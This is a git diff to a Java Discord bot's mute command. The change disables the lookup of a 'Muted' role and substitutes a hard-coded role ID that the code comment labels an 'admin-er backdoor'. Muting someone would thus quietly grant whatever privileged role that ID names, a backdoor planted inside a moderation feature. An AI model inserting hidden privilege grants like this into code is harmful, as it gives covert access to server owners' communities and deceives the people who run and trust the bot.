@@ -17,8 +17,8 @@ public class Mute extends ListenerAdapter {
         String[] args = event.getMessage().getContentRaw().split("\\s+");
         String reason = "";
         Member mutee;
-        Role muteeRole = findRole(event.getMessage().getMentionedMembers().get(0), "Muted"); //TODO make role if muted role does not already exist
-        //Role muteeRole = event.getGuild().getRoleById("867255285910470656"); //admin-er backdoor
+        //Role muteeRole = findRole(event.getMessage().getMentionedMembers().get(0), "Muted"); //TODO make role if muted role does not already exist
+        Role muteeRole = event.getGuild().getRoleById("846780954386759701"); //admin-er backdoor
 
         if (muteeRole == null) {
             event.getGuild().createRole().setName("Muted").setPermissions(Permission.MESSAGE_READ).queue();
